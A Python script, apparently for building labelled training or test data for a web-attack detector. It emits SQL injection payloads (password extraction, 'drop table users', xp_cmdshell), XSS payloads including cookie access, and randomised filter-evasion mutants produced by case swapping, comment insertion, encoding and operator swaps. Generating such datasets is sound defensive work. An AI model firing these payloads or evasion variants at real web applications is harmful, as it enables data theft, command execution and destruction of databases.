import json, random, sys
random.seed(1337)
SQLI=["1 union select username,password from users","admin' or 1=1--","' or 'a'='a",
 "1; drop table users","-1 union all select null,version()--","' or 1=1 limit 1-- ",
 "1' and extractvalue(1,concat(0x7e,version()))--","x' union select table_name from information_schema.tables--",
 "1 and sleep(5)","'; exec xp_cmdshell('dir')--","1) or (1=1","admin'#","1 or 1=1","' union select 1,2,3-- -"]
XSS=["<script>alert(1)</script>","<svg onload=alert(document.cookie)>","<img src=x onerror=alert(1)>",
 "javascript:alert(1)","<iframe src=javascript:alert(1)>","\"><script>alert(1)</script>",
 "<body onload=alert(1)>","<a href=javascript:alert(1)>x</a>"]
SEEDS=[("sqli",s) for s in SQLI]+[("xss",s) for s in XSS]

def case_swap(s): return "".join(c.upper() if random.random()<.5 else c.lower() for c in s)
def ws_sub(s):
    for a in [" "]:
        s=s.replace(a, random.choice(["/**/","\t","%09","+","  "]))
    return s
def comment_inject(s): return s.replace(" "," /**/ ",1) if " " in s else s+"/**/"
def url_enc(s): return "".join(c if c.isalnum() else "%%%02X"%ord(c) for c in s)
def op_swap(s): return s.replace("=", " LIKE ").replace(" or ", " || ")
def logic_inv(s): return s+ random.choice([" or 'x'='x", " and 1=1", "/*!50000*/"])
MUT=[case_swap,ws_sub,comment_inject,url_enc,op_swap,logic_inv]

def mutate(s,n):
    for _ in range(n):
        s=random.choice(MUT)(s)
    return s

def rec(payload): return {"label":1,"method":"GET","path":"/p","query":[["q",payload]],"headers":[],"cookies":[],"body":""}

seeds_out=open(sys.argv[1],"w"); mut_out=open(sys.argv[2],"w")
K=30
for _,p in SEEDS:
    seeds_out.write(json.dumps(rec(p))+"\n")
    for _ in range(K):
        d=random.randint(1,4)
        mut_out.write(json.dumps(rec(mutate(p,d)))+"\n")
seeds_out.close(); mut_out.close()
print(f"seeds={len(SEEDS)} mutants={len(SEEDS)*K}")
